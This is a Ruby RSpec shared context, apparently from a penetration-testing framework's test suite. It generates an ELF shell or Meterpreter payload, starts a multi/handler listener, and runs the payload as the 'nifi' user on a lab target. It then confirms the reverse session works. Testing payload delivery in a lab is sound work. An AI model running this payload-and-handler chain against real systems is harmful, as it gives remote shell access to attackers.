# frozen_string_literal: true

# The common native Linux launcher deliberately admits root/labuser only. Keep
# that contract intact and bootstrap the authentic NiFi UID in this component.
RSpec.shared_context 'native NiFi session' do
  include_context 'native Linux session'

  # @param kind [String] Expected genuine shell or Meterpreter session type.
  # @param delivery [Hash] Payload, format and task-owned output file.
  # @param user [String] NiFi, root or the denied fixture account.
  # @return [String] The opened and independently used session identifier.
  def open_nifi_session(kind, delivery, user: 'nifi')
    return open_native_session(kind, delivery, user: user) unless user == 'nifi'

    console_command('back')
    console_command("use payload/#{delivery.fetch(:payload)}")
    console_command("set LHOST #{listener_host}")
    console_command('set LPORT 4444')
    path = File.join(target_runtime.fetch('artifacts'), delivery.fetch(:file))
    generated = console_command("generate -f #{delivery.fetch(:format)} -o #{path}")
    expect(generated).not_to match(/\[-\]|Exception|Unknown command/)
    expect(File.binread(path)).to start_with("\x7fELF")
    run_target_module('exploit/multi/handler', 'linux', { 'PAYLOAD' => delivery.fetch(:payload), 'LHOST' => listener_host, 'LPORT' => 4444, 'ExitOnSession' => false }, action: 'run -j', endpoint_options: {})
    wait_for_expect(20, 0.1) do
      listening = target_exec('framework', 'ruby', '-e', 'puts File.readlines("/proc/net/tcp").drop(1).any? { |line| row = line.split; row[1].split(":").last.to_i(16) == 4444 && row[3] == "0A" }')
      expect(listening.strip).to eq('true')
    end
    launched = target_exec('linux', 'runuser', '-u', 'nifi', '--', 'python3', '/opt/launch_nifi_session.py', "/opt/module-target-artifacts/#{delivery.fetch(:file)}")
    expect(JSON.parse(launched)).to include('uid' => 1000, 'gid' => 1000)
    opened = nil
    wait_for_expect(60, 0.2) do
      sessions = console_command('sessions -l')
      opened = sessions[/^\s*(\d+)\s+.*\b#{Regexp.escape(kind)}\b/i, 1]
      expect(opened).not_to be_nil, sessions
      label = kind == 'shell' ? 'Command shell' : 'Meterpreter'
      expect(console.all_data).to include("#{label} session #{opened} opened")
    end
    path = '/tmp/module-target-session-proof'
    target_exec('linux', 'test', '!', '-e', path)
    command = kind == 'meterpreter' ? "execute -f /usr/bin/touch -a #{path}" : "/usr/bin/touch #{path}"
    flag = kind == 'meterpreter' ? '-C' : '-c'
    proof = console_command("sessions -i #{opened} #{flag} #{command.inspect}")
    expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
    wait_for_expect(20, 0.1) do
      expect(target_exec('linux', 'sh', '-c', "if test -f #{path}; then printf present; fi")).to eq('present')
    end
    expect(target_exec('linux', 'stat', '-c', '%u:%g', path).strip).to eq('1000:1000')
    opened
  end
end
